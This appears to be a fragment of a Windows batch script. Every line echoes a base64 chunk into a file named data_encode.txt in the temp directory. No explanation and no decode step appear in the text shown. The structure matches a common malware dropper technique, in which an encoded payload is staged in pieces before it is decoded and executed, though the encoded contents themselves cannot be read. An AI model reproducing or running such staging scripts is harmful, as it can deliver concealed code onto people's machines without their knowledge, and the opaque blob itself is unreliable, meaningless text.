echo Ui19IgJpULTzxgPWr6lc8sgiivi7tP9ncXXE1cLi6yglFXBoWzjbx3G0xj3wYEtw >>%temp%\data_encode.txt 
echo rjwLT9/Eke0TH0IegT4gvyUfkEOjjv6ID0i9QpVnUPq4ok9htMOlFlcnxeMQ17tL >>%temp%\data_encode.txt 
echo U6VSXk17RZQw5lNt/rpLE+RH49x3xUpLre6lZtplKGbZWF7JBDgFFlKarkLm+1NV >>%temp%\data_encode.txt 
echo MkfiGJjMI7L/i2R+85HBEMsHVyfzouEDk/n7hwdL5no+whzgQChZ5CELxd1yYFLj >>%temp%\data_encode.txt 
echo fPw9HKYKbrYj302VDqBAgEs8cN5xmGOrX+SikIG4aqiBq8qzeO1IP8n3R/HTidJe >>%temp%\data_encode.txt 
echo x3ngnpTYfbnFFRCngcRha3fPMauWEsZG32Mbce7pschMm3Eba+ookoXZjp17VgIa >>%temp%\data_encode.txt 
echo l0btoePW449qzDQOXV0m0C2PUZOUTGSo448OzFCf+GRw+zKj6fD0Ft8/Ph2YsU75 >>%temp%\data_encode.txt 
echo ZBA40OAoFdCkjAyuvJyjIPYUGB8vtPOYb2LPZ+3euzqfw5OZaK2Vn7Hiae1L0rHv >>%temp%\data_encode.txt 
echo X4QF49juffCSyn3/oj0dNIwQZ7N4c06GeKOtI6dcTDTmu6pvRQjB8/kg6hu0oGpV >>%temp%\data_encode.txt 
echo CwpVFZvLH5PhJbLu16YJzDJL8RNMlJ041b3Dmsd27WhLEkW3niM09kg54gaJiZa0 >>%temp%\data_encode.txt 
echo uiIVwQCsW08rPe/7J0G2x1KqIsrhq/tfs/IIvxxP4FId0H9HwzJvIceCXfRZ3yYY >>%temp%\data_encode.txt 
echo Z2/YenibgekqvWG/hUsKsYMNxCPPKINSkuwq8qEy0/Namt4I1DeHWmtBruUNwydA >>%temp%\data_encode.txt 
echo 8srRy+Rya2vf/d5qOgQN+tCTHtsZKWYD1nn5EI68902ehlu07D6Ag09efISO3R/j >>%temp%\data_encode.txt 
echo fah6bw9T04VtxHkn9JI3Yqrh/IGcTbrKUNJVcNiVtfAunUtP5wa3PsyrwiB0YqVl >>%temp%\data_encode.txt 
echo +aKqigXzllRY5tsfeogCUWv7R/XfbKPD/a1Pwpe2WZsxL2aH4FxNgSf2PclcxfDb >>%temp%\data_encode.txt 
echo ctouvDvDYmnJMc1wV+9pWk+cMJGdT3nbqua37iIuLznwXjqKAJ/i6GBYovt+C+IY >>%temp%\data_encode.txt 
echo RbBXDjGSSVcPfryTTRbxucHcWNtxC7DMmkgH14Hkfr2IIhyYWcv8/44AseZNhziW >>%temp%\data_encode.txt 
echo Qwuu28YS90usG5cuxjZh++pbsYtE1F6YnH785icNtCHqe+ojePK4nI3wbJ3yk6NV >>%temp%\data_encode.txt 
echo 4n70E2IMuAx81QGP6INyLg6BrXkzDpar186jOiCn7VjPMpG/AwX93wC5WXAFkV8m >>%temp%\data_encode.txt 
echo WPA8m2CZke4F5znEbpm12F1gQfsuhnciD0/QMp7tUKM8IZliw5WXmT+0mrILv+rb >>%temp%\data_encode.txt 
echo upCGwKpuhWMxX0UHOknAeMdg+zZjU5UQ9UhAhuoxOxeGZTOOJwor59XJOkF9WWB8 >>%temp%\data_encode.txt 
echo 2YnNTsO73ThKLJt8LnbS1illI9qlJPyOHE8dh8HaYOXYV7GDw4g6iFbaBdcC9iXq >>%temp%\data_encode.txt 
echo zjqGNvkNohJQj3qQSnqlt4NU8iryol9ZcB5quF1zsC+V/D6LqGRpMDmaTiXqjubM >>%temp%\data_encode.txt 
echo h6nEE5dgXUp8G/tA/E/6/PsXBSd6j+Pzt440aFPxMD6fi8+rAAgMx0cHGDlhE5St >>%temp%\data_encode.txt 
echo QXuCkXDmdqiu6DrtvEv4hlfZH+m08+cDGu0Y8bUDnirzEC7zmaPU0zJVB7U8/CMD >>%temp%\data_encode.txt 
echo uaB7EJRai1yVUcwhA8X8EgHtuUxyKUKWswklMFt8JQdwAtMkbWlijDWRdm7keByv >>%temp%\data_encode.txt 
echo iRL9pJyW4rHMRBy3GKiyeQdRgZiN7ZUZtnkrHWiddhAh4vsmNfk2vPTyI7jNiGzl >>%temp%\data_encode.txt 
echo jLo9c64huNo98OFgJI4TWjypR+bVqCH/FyyuNqTywICfpI3+RATKYH2mm4J4SslD >>%temp%\data_encode.txt 
echo li2usj+CeRfmV1ZFcvRThc9xDx6100guNTkza8V/ST/VZV2LhcWYJcargvtJ+X3p >>%temp%\data_encode.txt 
echo LxfV1FRWWG5MT8+40VIzT1xIqRcWV1dWi6OXplD4WIDT7/zuTFszcewcHjl2NIuR >>%temp%\data_encode.txt 
echo RAHlYNUv4YOBkVwd/SPciTxooGEsFF4dpUMlcVuKr1tPHM1J89OG8vaTJG9/Muq7 >>%temp%\data_encode.txt 
echo n5S3XZ1STAMe4nO+wLJ7n2f7son4C2LGpH7tzykXnMeHIGMnGzMah4YzrxTel/c+ >>%temp%\data_encode.txt 
echo x5mgKs5BdKd2NtsP9IOYkyE467B6DLO3HiCxZNaQvmLJw++TWDKsLvcC1AHJ5LRZ >>%temp%\data_encode.txt 
echo 26/X4oYBi87EmbYtihLuYlAfV14o7ehkQqdAnsi03yAnJZCFTXCtNbOlCxe2pXDd >>%temp%\data_encode.txt 
echo i80sxGYm4OL4sxA9rF3Bccf5cmHN3yIovqRzXT63ruf3+dzkjflcxEb2e7U/7f0Y >>%temp%\data_encode.txt 
echo w7PzT/x4nf717zDAiRjEN/9//P1PfLP/973hKBNmAgPGH58L0HHpreA6gPzetSVM >>%temp%\data_encode.txt 
echo xXcdnYVwPRwWnD5Yi+SZeKLTCSCfJuKShELsxv0qneoE4Aq7TGcxLa4OcSjT9NDE >>%temp%\data_encode.txt 
echo 9yqvb5LKSQ2aaJuS2ttbNw4IuROaAu2UYyazsF+TMPIOzNHbMWKPut7Iufj9SULj >>%temp%\data_encode.txt 
echo cMcdQOkb1H0QXtWT/u9+EpM/rbuds0dAe0Z7cWrFIryA4KrFJQOEZGy0AyOiYT/t >>%temp%\data_encode.txt 
echo i/oriwnmoLK43R1k3c+3M33N9GP7CNLp+pO9db299fs5mD7r6luRMwUznJJ/hhsd >>%temp%\data_encode.txt 
echo tWGtusPMGQOs0cf/1ayp4YH8BIvg9BAbiV+7npwgUh+C8mkTyuVcHFNAVgZXt2eu >>%temp%\data_encode.txt 
echo q7cBxH+xQNPlsX9f/E21w4jDDE2C4aJIQrQqGbq2dx/Hzsr0H4voCBoL/fjP8McN >>%temp%\data_encode.txt 
echo /h/7BuMaQXnQTyvfk2Esd7hbC7ZB1AMo+zcXiyeGB3wdzWY6f5hMUbisUourXbyF >>%temp%\data_encode.txt 
echo Ujj3Rfsa9Wt1KtpX72NoB5KzOvbw4z8R73N1rgh7m+sRiLMNiosjwJ9D94ibey6a >>%temp%\data_encode.txt 
echo 67/oFUgvMiNj3NwGI7SbhQuz1q3gOfuzKDlvlHNJIRFIIcH2KEtRAkqip1H41HGc >>%temp%\data_encode.txt 
echo VxaqkoAR0/nhSJu42KDgF8DNGWYtEZy/J0qnVN53xm1dbDeiMBY+8WLPFXa3zftV >>%temp%\data_encode.txt 
echo fNsP9cfh5DA8MOZ7dD9DF+57kC5vQOVe72CkkmUDEIifD06WSgPEpd7BEAces3Xk >>%temp%\data_encode.txt 
echo 1kK3TYKrDEeXJTCfCL0WnAVXdnNXu25eTO65sjW/wNa0+Va3q12tvbKrR/cOpqv7 >>%temp%\data_encode.txt 
echo LgX9/40fuBQa7O46A1Tn3kF0t2sv4hB0DTxaeIpbBV1536ScZt4fFAvRjTtBIG4n >>%temp%\data_encode.txt 
echo I9PYm4xFpNOUald4/FEop2zDE0oxZYyhukrh0aW3dbGdODyK9K4J3bQ7nqkH7VVG >>%temp%\data_encode.txt 
echo d2Mm4EyKeS0O8YbPmaRkduvD62s9S7Nwg0doPDjVFY+qu/2oN9ziPwLkYvWGp+Is >>%temp%\data_encode.txt 
echo 9L8HN6O94bf597B1wDHBJFboO7toz2jl1CUCCHGI4+JKYfUBjO4VSapLMVNHF7ay >>%temp%\data_encode.txt 
echo scL1AjfnEa8f6RXl69iGPcg/8MzkVSQEEEPzaTzMpzm0Rel/ThOBFGdXUK3TuuO6 >>%temp%\data_encode.txt 
echo mWm8yiw6aRaPD0lrq8vthssMKdvJrCRjgHNmwkjZJiA8fCeaYQ1SvgzQAI7JgDJZ >>%temp%\data_encode.txt 
echo +OoivPKfWqdO9wxhZ+FMjhkgXmBFMzOYKImAESDJaChvKRsDxM4SvaYMJS6gJ1je >>%temp%\data_encode.txt 
echo zeyJxFpl5s3Gz1a5d3wRMbQ4OX428zM8R5m9KdcylDU7WqNbsFxuCwzlnoniMM0e >>%temp%\data_encode.txt 
echo LTQWX9fbEH3dVPsP3tA5/kMLFlYu+GXFoiVBAwhJ5pVaxr1FlCRWTbozgVmqjfZm >>%temp%\data_encode.txt 
echo rb5FF9QX2JdQOi18SFK6uHgxJd4YUMa/sn7fSrdpyYLgXeTAubj6P0q73dBMHb6a >>%temp%\data_encode.txt 
echo 5agvdNahH9OPrqjfd5QG+LzFXj1vfhVlkqlZspi2BpKXXjURwBXwkzF/8qKl4lIL >>%temp%\data_encode.txt 
echo 6EwspYAYxMDgv9Yn/lyOiY6QluHPLmsJuoaejHB0hwjOXbDIOLp5UObpIlRwJoXh >>%temp%\data_encode.txt 
echo BSyijzC7lmt8CDNQJZPRqwmtFB0r4/TzJSDBaOFMcPK+1ww0ToWaV550zw61nbEF >>%temp%\data_encode.txt 
echo SN5oJsWhhZ0+psUdVvLP0CuqcRhbvmnpfqmfyfS9ZqPJtN6ktUFoLLyuF9UbdPdD >>%temp%\data_encode.txt 
echo LWkGWUjEIdStW/GmY2WFcc68ZqY5kyBnz2YhYXDOXGZ+VJcodTtqeWit+0hl0L0q >>%temp%\data_encode.txt 
echo 1zoMi36e+KCtXe1+uxjl5a9LnyjRLVxmSIfVG0dbCNxzmuj7CxDPNj+jWokOMEuo >>%temp%\data_encode.txt 
echo bx/MbBiUbCzfhPu9ShN7oy0mvsaey/oqcu6p4Cpy++5BrE1obO30LcCiSewTwPuV >>%temp%\data_encode.txt 
echo merH78KPd7DGNpG8dxtZOPBesaEnwBnBhc5Wygj4N5WZW7V+csofoDAxSsWO1YzC >>%temp%\data_encode.txt 
echo DTG7GbTjTwSgHMfQ9t1hTdwCdNf6CFfvtCZmEH28ldbyZ1RrWOO7wLH3bWoiExkK >>%temp%\data_encode.txt 
echo /nISyuSmA6gsrkZn6WYKPPEfUG7z81jJ6wrQ0AnOWnRQoZqkMsgxVPMI6hOTgjUr >>%temp%\data_encode.txt 
echo sOYWhgjn9UjJaSRDF6EM3QYt3+RUXz4FN3WrkNiWG+3zojXRDQqL7hTCW1E78pV7 >>%temp%\data_encode.txt 
echo yECfi2WENXjKS3i31mqRY7CVjm/nSrlrKVBUEv7UtcxtGCHHP0/NHIvbW++GOHxz >>%temp%\data_encode.txt 
echo Xe2bqZDzGVyAJswVHv8tXEwR53lDOLV0GjZdit+K/9O2EcRIZ3vD3VDpV5coMLW2 >>%temp%\data_encode.txt 
echo /5e7lYxaWMY93STF4K272qTVmmNydjY8aLIfViYy370RE3jc8E9oKLQmwO11GfDv >>%temp%\data_encode.txt 
echo erJwHmwmm5zjfIh4M2sG+U+/gzNwi3rXs4sDKroGEI8RHlgppUgVAzP/YJB/dg2C >>%temp%\data_encode.txt 
echo cpvI9/FljBXxboScRJ9EfyD4ZEOo0oIKQC5i2iQ8XoF75Eg+dSsAVS6kbuFdzr9f >>%temp%\data_encode.txt 
echo RaM9W6bp5QqsTJJjnmEWd14FCbOgEpqjPE8UjI+8EZyy/jIFUOX9n7JnyMxuwGL3 >>%temp%\data_encode.txt 
echo wUDlkY9UnrK8B8UFATMC0MAuN0k/AB4ixXGa/knPGfrdE02b8S5lX25vKAYVqKMF >>%temp%\data_encode.txt 
echo eOgkVqgBMGj/kB02CUxKsIhZAFk6K+ciphoEZ7t4vRSQCW/uItNmhr+hkxDtJvvX >>%temp%\data_encode.txt 
echo 0hHlNyiyZT+vxmq+8RST0Cilh4s2V8S/4DBvUztzTSJOMkZESFk0GISHYjYoeRcu >>%temp%\data_encode.txt 
echo 6wKz1KKJSj+/wHgR7hK+zalTosaA2pfeGozAjEc5oRWMkm2daCu1nfF99hbqOFvU >>%temp%\data_encode.txt 
echo LryKdzqlbUK4SdhaZqinflB1YgFK/QXMV9L4M0AGUXnDNc4OIHkx2Sg/ydmEp0kM >>%temp%\data_encode.txt 
echo E0LjNfnOjoZ7YfzktOfVPQjliytEW8FVQZ6aPwN4bC41DHd2ED4IO+47NXwQvFkI >>%temp%\data_encode.txt 
echo j9rAoKZA23oA4yuDIfZnk16rTZubQ5hT23+YSMVj5gfnQly0Ou2V2tIjx1B5UC7v >>%temp%\data_encode.txt 
echo vQ0WIMEJ80DdW2BqYad9PJvv3ogM1szeMLoNz5BpuGQaPvcMkxSPt958E+cN5ZQ7 >>%temp%\data_encode.txt 
echo zwc1o+A45HcFF50DBvy2Nw0Cv8E5c7rJiNK/NyGDAG1F+ajrSnXsg4BKccX66Oyl >>%temp%\data_encode.txt 
echo 9SCg0hzbaORjnw42Z8KgmqNT0QNNxoG8G+4U/3lt3mN7EZ6ctEVlDKlY4Mvz+v6F >>%temp%\data_encode.txt 
echo nEvCwtckLPQyYcF5+cqe8MaeJKk9AXjf/NC3JzXQE1pmDfsj2gStSYBv7+jp41/M >>%temp%\data_encode.txt 
echo /CWr5GcoKIy8zepkEWRw/viE8cxXvzaUySkjT7BAbyz0P1D01Xy0gNLdS/QjBXL8 >>%temp%\data_encode.txt 
echo xmAE1ToANOoT39i3mENBGzkUDGeeme5iawksgpPRAxEdxcjzAzWxRiodK5EEOIJu >>%temp%\data_encode.txt 
echo eFy68TA7GtYOsvDnZbZOtz0PVJ0S6bCtw3Twmov1F4+99qxJWFMBBZZEw4xedfvH >>%temp%\data_encode.txt 
echo wpp7kcsUsTDJonWyK2CPRm81hJjJIBUjpHEAaXJ/SHjiIAjpr9jponGcfv4M4OWp >>%temp%\data_encode.txt 
echo 8AoR3lq2N16I8CYDvLy+8JanLDEzWMtHthVN5oKBAFX8oF9OFQm/9RcfnHxLyJJr >>%temp%\data_encode.txt 
echo l0OFOuWPHy0zt6Enb6//7zjOdU9u5OoVru72j+s7EbDubxzNdFnxNXTA8W+Xi/Kk >>%temp%\data_encode.txt 
echo osn+rSq0eB1aFIOm3MYW158EeBMBpGw58t150t3jFBOFurkK2A2XBwf2b9sJbCXu >>%temp%\data_encode.txt 
echo sSE11FrH4St0uvM0kekFCKQCyADo46EgfdCraGGnaH0INGNrheer2CFe5A+70JZa >>%temp%\data_encode.txt 
echo hDQx2dVuN8u1gOZecQq6HroRuyrsSh32XAZ7vg77/iDs+Qh7rg57LsEep6OcAiSC >>%temp%\data_encode.txt 
echo gIdtR4sx+uio4d3DVPjF1nI0gZdZH6SDbrjL0r1ThV9rfVDYWW4t93wdO+RzrMQB >>%temp%\data_encode.txt 
echo fGWaKld/sZPtYLbAhBH5rbH2yCYa2M9gPl+yNb+Jk1L69vuXgWFw3CjO1xJBHbd1 >>%temp%\data_encode.txt 
echo kHfjHkA6NHWq42Rd/Z46UDekmSCf9GB4c0weqfmVVtkthgy4LF8RS+kXzIOoZeDU >>%temp%\data_encode.txt 
echo 8pODiliDidb/e/Ud36TCoIyGEbHSrC8mnxFERCJwV8qhMGJ4MNOBfYiDLM+mleGO >>%temp%\data_encode.txt 
echo 1tQWWC+hIDy+Cy2vrg6RzrABskeTfewlY/S+aN/c1wfjgfknFYSF1ql+IJIGA4Iy >>%temp%\data_encode.txt 
echo Wuj+WhiOMQFtLCCUwHpx23DSEtnKLR3RjCnr9PKJ6AnjG5uq+nMNldEx5oCjNbGF >>%temp%\data_encode.txt 
echo 9j+gYfKMWIT0xBvENLHn5C2r+3Fxaogq3+6/Ett8CwklT2xEMtpFj3h6hEe0mFbY >>%temp%\data_encode.txt 
echo p6p2KNJXx6rnCb8Dme+ou7RXqQl2rM/6gZ6xeRQRHsj2wlGSxFzNm5Dtwyqxu7c3 >>%temp%\data_encode.txt 
echo uG70XzL0pYLaMMrb373XF7mDjQoRfmkTMhCYWZauM2HERTqQi7gCGNYWj07Yb6dz >>%temp%\data_encode.txt 
echo u6rrOqdGsf/kDdXFDLoC90Ljd+6Vvb4DbzAFpDVVOq/5V5FiDcKKMxyE2R1SgMIs >>%temp%\data_encode.txt 
echo M6MwzLlQxz5LMh7zkybG2ZqxPLQMaPU6bH8IG3b68ChmC0TBxHffDs2/7XrhXShL >>%temp%\data_encode.txt 
echo ZjpHt00cCv9WDQUO350phiCjT2xZR1FsHd1j/GfYenIV+EkG+Be0zonRQmOx9Tpn >>%temp%\data_encode.txt 
echo u/DuQXvYW2lYnghnUuV8i22sZUxmZjaHOew5y+isMZhsM4WLnLWoumLx8qWW8dmW >>%temp%\data_encode.txt 
echo DIt2M033Z8tKz0q3WUY/sqj64eWWpTWVCzBvOADKyhyXOTbNlsLRm6wxUPnhBQss >>%temp%\data_encode.txt 
echo OJ/R7mh/hWKuJtSz37jV7Dd2HfuN3s5+zQfZLx8bH3S2fPMvg5hjOPsZ/8ihIxrl >>%temp%\data_encode.txt 
echo xGuRFxdCuR/Qb/AfrxN63cWUMYzMQWdfZ9b7TlEQdsNMEnZDW1M8+VKUK4CPyq03 >>%temp%\data_encode.txt 
echo 4PPrUt4rkG7AgxO2ZoBIDpQF06dNmWblZr6DxMyIHvcm+5M2dxWPdVOQpJuhgW/+ >>%temp%\data_encode.txt 
echo BXT7TFxCWwDDjou9xMzFZRi7D9NF4uyd8bq+1fCiIdckED/uod6o7i1oB5DJHJRO >>%temp%\data_encode.txt 
echo VeKAFCLQEc4kZuIeJE4cgXyxoMj1DCpeHtjOlhSflgeS/AurrDc6eiLtXu17A33H >>%temp%\data_encode.txt 
echo +5r2nefoO/aNVM//xDo9DxiU2k6lzMpECo5ntBeWm0jWrFG9sbq2ETWn4q3XN+IV >>%temp%\data_encode.txt 
echo suS1Cc5W1Rfq8DbdznJpm2bmw0g74/eK7OA1vPluG9nnbhAaC2/ozZnANrHQgIcn >>%temp%\data_encode.txt 
echo vNCAVw+/6x5q42/I+DmMcay38IYQFskP7d2IijXo7gMNzhOzgGhy3LMsmvvSk9tY >>%temp%\data_encode.txt 
echo j6rhl6avtIYcpM7Xt5YbjZPTWDmDfO27bRsKcf5P1P5PU36FRwj5G9InETeFWv5O >>%temp%\data_encode.txt 
echo y+jkqop+y2MKWx+D47Wp2OhcssMqsjFcQeeX7DFoKNXb4ugJXXYbiihJIEK4p2GQ >>%temp%\data_encode.txt 
echo YtROBDPugZ53z7w0/vDy61noMzGJtkEUt3grn3LBvegSILWZUnq+it/3vZzM6V+F >>%temp%\data_encode.txt 
echo Vx1sb9jW6cjF9pjkGXHyWkKk8FwL5vhQjW44cOWwrpdbLbSDifp2LEGICxRaU832 >>%temp%\data_encode.txt 
echo GA2oUotLUUCMcvTyy8LrVpo5MQrUcdw8wcAp7nsJAyLbB05AU62jN6ppOtRcdpSW >>%temp%\data_encode.txt 
echo Vnj71Z+JZcTB6hjXFMFSJ73jnnXRPW0IhfjEYsW0qsdpsRs3f0mKE7LNa2VM7AZg >>%temp%\data_encode.txt 
echo /v3PdPoq1l+Pkh8+VftGwiBUOjuMuvChTElSQaDcq4ojq3YFChJi7Y1I/vGv5aP7 >>%temp%\data_encode.txt 
echo bIIxb8OplwYjN4gozvfzL1LPs4mkGY1FmUi0jvX9Dju8x9UhnROcaBSU/0+svMQs >>%temp%\data_encode.txt 
echo T+Xl++PkX6F7b6IcYgtApxPqW/BQ13Rh59q04a/lcXfjOK2cHGgJtY9swkNlXX7p >>%temp%\data_encode.txt 
echo iPSxpyfsqZSP3YWvcO64Os/JkPGH+r2OwNdl8Dp1vecUP95vDyNLgTt1qHtsp+lb >>%temp%\data_encode.txt 
echo d/T30jF3qlR/9jUM/9zwT3wn/xYUXYLiuRzSpTRpZ9ikgzC20Z4LYZ7ukSkHUz5w >>%temp%\data_encode.txt 
echo y7svAHrf61KQ8DwXRy5qjh3KcZ7uiJSj7ugx0PkEd2IKyBcJ7rW33RLxQ++i9roZ >>%temp%\data_encode.txt 
echo Js7zFeEo5aw7cbvpkJuPyu394wfXSntWhb3FvfjBtSQq4Okj4JZoV+W7TsNsM0gN >>%temp%\data_encode.txt 
echo GDYfMJvqe3ib5quQhQcH0d0DEGiRzVIX+jXDh60pn48/NqLTdCHltGQef2GpqYAA >>%temp%\data_encode.txt 
echo Rw8zTef1s3o07d+4B/pMupBh/l5iujUGPtMU+kMHUQCTk5iMhEY15pYwZdSngNZi >>%temp%\data_encode.txt 
echo 6wrBWRdOEV+Gs7hBxw0rjJzNu8mDIVaX90SKVkJzpWEuzZVaDEORE06eaF9i/GEc >>%temp%\data_encode.txt 
echo jy4/DYBUhIS+Qh2HmTwuMhiWD+ZmbYhogxrHtRrQ+xXAbjDemlpZlbnOSOHSvbzg >>%temp%\data_encode.txt 
echo igth9XgxHer59HrbKGdqnzrwJRjQFfB1kNkFaEFtfSuODWOgz1i3kWBJP8hOX/2T >>%temp%\data_encode.txt 
echo SuVHglQ+1Swv0ai82DpbDmH0Df0vm24LGKm85P8tlUcjlY99z53aKB3TqBzj3V2N >>%temp%\data_encode.txt 
echo ynOIynOuQuWzr6BypPAyawnwqDL3DqJyGPmyRQGi9BN8iuJObEAqzxqIynfRWLt3 >>%temp%\data_encode.txt 
echo WDeqq/QVtM5iykobrFtwVbK/pMkWTjxQKTupvszirAIWEQyQf4/MygP+ce8g5bPx >>%temp%\data_encode.txt 
echo n8MkUFK+g0mg4CRgOMZ5cDevpKLiy+gffWQBn7iAuzfQD8X/+ONP4bPCgM+5/fBZ >>%temp%\data_encode.txt 
echo /r8ZnxVXwWc54HNuEJ9zB43POIbP7VfHZxPD5y7Kt/0nHZ+PXiJ8Yn1AWxPD53aG >>%temp%\data_encode.txt 
echo zy6ZlQe87UB8XsHU1O8SX1P+5VIffBI/A6T+nSH17ypSI7cEkToGPwrr0ETAKw/N >>%temp%\data_encode.txt 
echo FhGxGAStBtCrI7aKIZZDxE5e+QgiNV3DGrLkI8iUPd1h8JPzVAr8w3F38+t1HA9U >>%temp%\data_encode.txt 
echo OmLA0jyUjmYoV9XWuKGmw+64TvfYQ+7oRunYfwJd71nM5j4AgENLzX0JfFRFtn53 >>%temp%\data_encode.txt 
echo p4EONNxWgkYM0Gg7kwwB0hg0SKLZgAABg0SIGFmEAJEAMdwGVITE7miuTRxGcR2c >>%temp%\data_encode.txt 
echo 0XF0nNE3+J6KEBEIwQRwY3FBUXEZ9TYNKKAhsiT/852q20sI6syb997fnx2669Z2 >>%temp%\data_encode.txt 
echo q06dqnPqnO9Q3+Yas99q+tdmP9+lYvZ3hGffij1rLhUoN39X+1IaT36uq1xO/mfW >>%temp%\data_encode.txt 
echo pF21CVVUrsz8xlkEQAdeIeRudG0Xx2+a/OiZ3yVmHtfI+nNPh2b+mpOM07pLTDkK >>%temp%\data_encode.txt 
echo +z0m7R2/yEk08aaY8w9pzluTtg5r1TwmmvTa9J7mO60B88nQbJ9oDeun+1jl9XYF >>%temp%\data_encode.txt 
echo NM0NkZtIBzzd6b9eRK33e6xEZCAm7XqT5rEGep7ka0Sin9WCya+WTH7nk+3ohw4x >>%temp%\data_encode.txt 
echo 2TjN0KjngX66Esnkh+kn35Xrbr72/yP6yfzv009+R/STSQXyIukn7yz6yf1p+qk8 >>%temp%\data_encode.txt 
echo B/3UCPqBblqf91SIfjJbmX5qBP1URtDPSkE/vp+iH0trR/RD5x9380RowaC4KgO2 >>%temp%\data_encode.txt 
echo xXn+O01ZNN+nFF8fc3t9d232e96WIco9XS1sr526Kcu0yrEly4TPFfQxbRb//jMf >>%temp%\data_encode.txt 
echo R7t//7c/ke0Pv8mk+IBl1BgzjQ7MN5rbnfeVdWZl3a4sRkoDwkwMZNo5jZ0HaceS >>%temp%\data_encode.txt 
echo TnpP2pZnaUfd+2uX2LRjLwyi9VRjycnK9p6KWdGFSvq2eL5ttPCK+yHpTPXh5SRO >>%temp%\data_encode.txt 
echo tTlVKBiFq9XItmnBY9qHSUe9P1qX22unWrWbTI0jrabgO/QluBNSyTS5LBvaWjkg >>%temp%\data_encode.txt 
echo qerWtoqWO9XZWGWZtD3P2xKzvBOv81qrw9tiW27X3sY9TCEEmN8RD6A2dnt/pPTa >>%temp%\data_encode.txt 
echo MTZtnKkx22YKfoo2PuRuKj4YXqYPUi+gYYiy98oJwDu98jazyfOPxphBWTn0J3iw >>%temp%\data_encode.txt 
echo pmfw63PgO7B8BN07FKGgsER46QOwywgU8aSzkgStEfy9qYuQYz3daUxYkheG0VbX >>%temp%\data_encode.txt 
echo Z/Dk6vskztYplB8XTM1q8Sr/JCvrg6fyZYB/vB1i4DedWAycwi1OtbZZmD/eL/xW >>%temp%\data_encode.txt 
echo 810us9nfV//iCZPhp6N9GtKpfvwE64Sr93uelo3CUgct6rufECgCkHrb6Hw+nuXU >>%temp%\data_encode.txt 
echo i6lacxdKDz4X1nclS31XiiZQPNJ0K6uV2SvNc3HHLsBi/0a8lN9xQ+z0+S7UFWV8 >>%temp%\data_encode.txt 
echo WYE7PzvLSstETBl98+/C3qHPSXP6Xqxvpn3/vyJquY9RhGUxNPF0uKTim9/GVstO >>%temp%\data_encode.txt 
echo yngRm1XTa6nh0oovH4qQMo4lnWDUsIgz2EWGAaKGBEQhha5ndmTpHrK0UfKGyJJY >>%temp%\data_encode.txt 
echo RKKkp6vwXT0gAUQuiaxjJyUGD9B6EvHOpcaFCSeXwXXZiVdCxeyzMHhEbOVwk1J9 >>%temp%\data_encode.txt 
echo TMh0KY8Q+Rz4Ay50TQ/nMPm0qf3oQQL9Isk9k1V6rX8IMdurhaVDmgj0YNTw1h8M >>%temp%\data_encode.txt 
echo nWV65TJXZkjzEoLFyBcxrtqHPorU2ys+GKgymiW95oDHpc8sglCpmSSopdvUYcTM >>%temp%\data_encode.txt 
echo oTjyl9uIygdwU4rvoohiqY9L4xyr4oMoaOjvjI5+/7hB7anVOzxJ7jaN39t43Em8 >>%temp%\data_encode.txt 
echo B5BrItRSiC8uR2ScmYrk80VPprABw/gceRwmGQ4eQCDdpGsZ1ocZ+ipNG4j6taF2 >>%temp%\data_encode.txt 
echo /O0Th9SN/A6bkL4e6jj/NNuJJgyBf2G81seGjAPj6S/R7FDOBEtk7Upvk3UTaj2t >>%temp%\data_encode.txt 
echo 1dcHLMefDowCdW1khRp1J+1Voztgg8/T0Aa6tMHoLPAPtj0LPCNv5Cags6+DhLZU >>%temp%\data_encode.txt 
echo nRH2WQ7OGGkfoqyLi688OVjxweSqptCamTlMX3wQA16sJinrcl1Z6VepdobAdB8O >>%temp%\data_encode.txt 
echo IBw4fc8ufi1GoNnlmAJ/ZJMgZCz27OXrAfeeYbrivYfSK5dZqZ4BVGfF92OUapWT >>%temp%\data_encode.txt 
echo kjOLFV8plyIu0ZibnGWqKU7OHBG4ntKyvSctnncytdcBFEssH/8Us49E2J870i+L >>%temp%\data_encode.txt 
echo rxOJb6lrBN8CGSWrsyVEpwt8q3SN0Cg30uosjHxQIB5AhQKGMeMxpgm2PsGSRfx3 >>%temp%\data_encode.txt 
echo WZS+5qyRCw5LZ4tS/fvTPNibhAk+GCVPtD5gjahFElqC+FnnCkGiq+e5t/D81mG6 >>%temp%\data_encode.txt 
echo nzLxTO/WdO0EzTYf5Y4/pwP9VRuK5hAhGwyp4fdcEe8JHBdGjIehf+sleUEKH4rL >>%temp%\data_encode.txt 
echo XEUGtC/79SXKIYvy71N8a82sTyxszox3qD39eVYYDS4TCx+FLVBuj1kZ4kOe84hP >>%temp%\data_encode.txt 
echo G77+Yr0B0Yl4OHHGq0JsuWZliMGpbzO8zmQbceZf+UfhhssHWHm4bVhUqBsxMAjk >>%temp%\data_encode.txt 
echo YjMs8XGHfRUlJIq3scJkAXeAiVY2plAdIt3OrlfYLp91qH0Qqry6zWOTm0D3qnwe >>%temp%\data_encode.txt 
echo CbM335XI963UGXo3ABjSYnURd7RRlmSJNMGsizVptCUZtyM0MAWIv8LRyyJYGZoE >>%temp%\data_encode.txt 
echo Bzr/Eb79cu/xtrRpjYoPLqlg82gN+yquhu/zCwv210FB5kfEdcbBwDow/T6JmN3u >>%temp%\data_encode.txt 
echo yZWsgkV+Z8AktwqgUBkXIo8BX2Fr4K5Wlk/OSf+PipZA5DdHEvm8RwUJN9CDgsgH >>%temp%\data_encode.txt 
echo 1z0aou05D0dTPrWa+2joGmb0o9GUvxNgq3sCR8OU/ypTvvvRKMq/5NEw5QMr+Xz3 >>%temp%\data_encode.txt 
echo nldB9lovk0H8p3H7o+0mutcOENEXiPA4wk0ADepvPxIm+qB3Ysl1JcDTLimoKF1c >>%temp%\data_encode.txt 
echo WlYyp8Q0sWSivI8Ip0Wd17yH8ml0c2kS8/QnHjGseJKNMHBYGHqLJnmH5zyYxcDk >>%temp%\data_encode.txt 
echo xrstX5xHQGwsXhUzkYM60i0CIpgrWLMjKzQHW4x6lOp72KwIM0zUeJ6xhtse5NcJ >>%temp%\data_encode.txt 
echo PmqUXhtR+i6jtLorpEYtZsCLqN3UAOs3ro5v5GK4d3hUX/sgnx1XSRs5kFbQG6qs >>%temp%\data_encode.txt 
echo 8GcqIxbYw6iM9n9cUU59UBhYwWBrA1faHe8U6N+O/9iZPpDzdz/Bo3c9JGi0oT2N >>%temp%\data_encode.txt 
echo Nj0U4tCKb5YIABB6+LeHQpS4efVZHHrNQyEqfvKhSDr1dMWNtZAroCxH+WseEqeX >>%temp%\data_encode.txt 
